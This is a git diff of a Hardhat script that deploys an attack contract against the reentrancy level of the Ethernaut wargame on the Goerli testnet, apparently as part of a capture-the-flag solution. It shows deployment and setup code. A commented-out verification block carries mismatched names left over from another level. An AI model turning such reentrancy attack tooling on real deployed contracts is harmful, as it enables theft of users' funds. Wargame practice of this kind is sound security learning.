@@ -3,7 +3,9 @@ import { ethers } from "hardhat";
 const attackReentrance = async () => {
     // change contract addresses here.
     const reentranceAddress = "0xEfC594B6E8100d412aadc34D4E6ACBbD6CC0E85a"; //type "await contract.address()" in ethernaut console
-    // AttackReentrance address = "0x44d67b486C68c1273871a5De10DD3fe2E8df4714";
+    const args: string[] = [reentranceAddress];
+    const deployer = process.env.PRIVATE_KEY || "";
+    // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
     // The contract is vulnerable to re-entrancy
@@ -11,8 +13,35 @@ const attackReentrance = async () => {
     // https://consensys.github.io/smart-contract-best-practices/known_attacks/
     // https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
     // https://docs.soliditylang.org/en/v0.6.0/types.html#address
+
+    // deploying attack contract here
+    // const deployed = await deployContract(hre, "EternalKing", args);
+    // alternative below
+    console.log("Deploying attack contract AttackReentrance...");
+    const Factory = await ethers.getContractFactory("AttackReentrance", deployer);
+    const attackReentrance = await Factory.deploy();
+    console.log(attackReentrance);
+    console.log(`Contract deployed to ${attackReentrance.address}`);
+    console.log("Attack contract deployed...");
+    // experimantal verify below
+    // if (attackReentrance.address){
+    //     console.log("Verifying contract...");
+    //     try {
+    //         await run("verify:verify", {
+    //             address: eternalKing.address,
+    //             constructorArguments: args,
+    //         });
+    //     } catch (e: any) {
+    //         if (e.message.toLowerCase().includes("already verified")) {
+    //             console.log("Already verified!");
+    //         } else {
+    //             console.log(e);
+    //         }
+    //     }
+    // }
+
     // typing all commands in console below
-    const attack = await ethers.getContract("AttackReentrance");
+    const attack = await ethers.getContractAt("AttackReentrance", attackReentrance.address);
     // const provider = ethers.getDefaultProvider("goerli");    // alternate defualt provider
     const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
     const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
